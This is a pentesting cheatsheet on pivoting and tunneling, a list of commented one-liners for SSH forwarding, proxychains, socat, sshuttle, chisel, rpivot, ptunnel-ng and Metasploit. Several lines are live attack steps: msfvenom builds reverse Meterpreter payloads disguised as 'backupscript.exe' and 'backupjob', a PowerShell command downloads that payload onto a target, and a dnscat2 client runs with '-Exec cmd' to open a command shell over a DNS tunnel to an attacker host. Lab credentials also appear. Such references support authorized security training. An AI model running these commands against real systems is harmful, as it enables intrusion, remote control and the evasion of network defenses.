Command 	Description

# 🧠 Pivoting & Tunneling Cheatsheet

```bash
ifconfig # Linux-based command that displays all current network configurations of a system.

ipconfig # Windows-based command that displays all system network configurations.

netstat -r # Command used to display the routing table for all IPv4-based protocols.

nmap -sT -p22,3306 <IPaddressofTarget> # Nmap command used to scan a target for open ports allowing SSH or MySQL connections.

ssh -L 1234:localhost:3306 Ubuntu@<IPaddressofTarget> # SSH command used to create an SSH tunnel from a local machine on local port 1234 to a remote target using port 3306.

netstat -antp | grep 1234 # Netstat option used to display network connections associated with a tunnel created. Using grep to filter based on local port 1234.

nmap -v -sV -p1234 localhost # Nmap command used to scan a host through a connection that has been made on local port 1234.

ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@<IPaddressofTarget> # SSH command that instructs the ssh client to request the SSH server forward all data via port 1234 to localhost:3306.

ssh -D 9050 ubuntu@<IPaddressofTarget> # SSH command used to perform a dynamic port forward on port 9050 and establishes an SSH tunnel with the target. This is part of setting up a SOCKS proxy.

tail -4 /etc/proxychains.conf # Linux-based command used to display the last 4 lines of /etc/proxychains.conf.

proxychains nmap -v -sn 172.16.5.1-200 # Nmap scan through Proxychains + SOCKS proxy (ping disabled).

proxychains nmap -v -Pn -sT 172.16.5.19 # Nmap scan through Proxychains to 172.16.5.19 using TCP connect scan (-sT).

proxychains msfconsole # Open Metasploit and send all traffic through SOCKS proxy.

msf6 > search rdp_scanner # Metasploit search that attempts to find a module called rdp_scanner.

proxychains xfreerdp /v:<IPaddressofTarget> /u:victor /p:pass@123 # Connect to target using RDP and Proxychains.

msfvenom -p windows/x64/meterpreter/reverse_https lhost=<InteralIPofPivotHost> LPORT=8080 -f exe -o backupscript.exe # Generate Windows reverse HTTPS Meterpreter payload.

msf6 > use exploit/multi/handler # Select multi-handler module in Metasploit.

scp backupscript.exe ubuntu@<ipAddressofTarget>:~/ # Transfer file to target using scp.

python3 -m http.server 8123 # Start simple HTTP server on port 8123.

Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe" # PowerShell download file.

ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:80 ubuntu@<ipAddressofTarget> -vN # Reverse SSH tunnel from target to attack host.

msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IPaddressofAttackHost> LPORT=8080 -f elf -o backupjob # Generate Linux Meterpreter reverse TCP payload.

msf6> run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23 # Run Metasploit ping sweep module.

for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done # Linux for loop ping sweep.

for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply" # Windows for loop ping sweep.

1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"} # PowerShell one-liner ping sweep.

msf6 > use auxiliary/server/socks_proxy # Metasploit socks_proxy module.

msf6 auxiliary(server/socks_proxy) > jobs # List Metasploit jobs.

socks4 127.0.0.1 9050 # Add to /etc/proxychains.conf for SOCKS4.

socks5 127.0.0.1 1080 # Add to /etc/proxychains.conf for SOCKS5.

msf6 > use post/multi/manage/autoroute # Select autoroute module.

meterpreter > help portfwd # Show portfwd help in Meterpreter.

meterpreter > portfwd add -l 3300 -p 3389 -r <IPaddressofTarget> # Add portfwd rule 3300->3389.

xfreerdp /v:localhost:3300 /u:victor /p:pass@123 # RDP via port forwarded 3300.

netstat -antp # Show all active TCP connections with PIDs.

meterpreter > portfwd add -R -l 8081 -p 1234 -L <IPaddressofAttackHost> # Reverse port forward 8081->1234.

meterpreter > bg # Background Meterpreter session.

socat TCP4-LISTEN:8080,fork TCP4:<IPaddressofAttackHost>:80 # Socat listen on 8080 forward to attack host port 80.

socat TCP4-LISTEN:8080,fork TCP4:<IPaddressofTarget>:8443 # Socat listen on 8080 forward to target port 8443.

plink -D 9050 ubuntu@<IPaddressofTarget> # Plink dynamic port forwarding on Windows.

sudo apt-get install sshuttle # Install sshuttle.

sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0 -v # Create route to internal network with sshuttle.

sudo git clone https://github.com/klsecservices/rpivot.git # Clone rpivot repo.

sudo apt-get install python2.7 # Install python2.7.

python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0 # Run rpivot server.

scp -r rpivot ubuntu@<IPaddressOfTarget> # Copy rpivot directory to target.

python2.7 client.py --server-ip 10.10.14.18 --server-port 9999 # Run rpivot client.

proxychains firefox-esr <IPaddressofTargetWebServer>:80 # Browse target web server via SOCKS proxy.

python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <WindowsDomain> --username <username> --password <password> # rpivot client via NTLM proxy.

netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25 # Windows portproxy rule.

netsh.exe interface portproxy show v4tov4 # Show Windows portproxy configs.

git clone https://github.com/iagox86/dnscat2.git # Clone dnscat2 repo.

sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache # Start dnscat2 server.

git clone https://github.com/lukebaggett/dnscat2-powershell.git # Clone dnscat2-powershell repo.

Import-Module dnscat2.ps1 # Import dnscat2 PowerShell module.

Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd # Start dnscat2 PowerShell client.

dnscat2> ? # List dnscat2 options.

dnscat2> window -i 1 # Interact with dnscat2 session.

./chisel server -v -p 1234 --socks5 # Start chisel server on port 1234.

./chisel client -v 10.129.202.64:1234 socks # Connect to chisel server.

git clone https://github.com/utoni/ptunnel-ng.git # Clone ptunnel-ng repo.

sudo ./autogen.sh # Build ptunnel-ng.

sudo ./ptunnel-ng -r10.129.202.64 -R22 # Start ptunnel-ng server.

sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22 # Connect to ptunnel-ng server.

ssh -p2222 -lubuntu 127.0.0.1 # SSH through ICMP tunnel.

regsvr32.exe SocksOverRDP-Plugin.dll # Register SocksOverRDP DLL.

netstat -antb | findstr 1080 # Windows netstat on port 1080.
```



